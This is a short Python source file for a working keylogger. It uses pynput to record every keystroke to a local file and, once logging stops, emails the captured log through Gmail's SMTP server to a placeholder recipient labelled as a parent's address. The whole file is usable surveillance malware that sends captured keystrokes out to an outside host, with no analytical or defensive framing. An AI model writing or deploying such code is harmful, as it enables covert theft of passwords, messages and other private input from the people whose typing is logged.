from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import threading
import time

def on_press(key):
    # Write the pressed key to a file
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    # Continue capturing keys until the keylogger is stopped
    if key == Key.esc:
        return False

def send_email(subject, body):
    # Configure email settings
    sender_email = "your_email@example.com"
    receiver_email = "parent_email@example.com"
    app_password = "your_app_password"  # Use the app password generated for your Gmail account

    # Create email message
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # Send email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, app_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())

def check_keylogger_status():
    while True:
        # Check if the keylogger has been stopped
        if not listener.running:
            with open("log.txt", "r") as f:
                data = f.read()
            send_email("Keylogger Data", data)
            break
        time.sleep(10)

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start a separate thread to check the keylogger status
    threading.Thread(target=check_keylogger_status).start()
    listener.join()
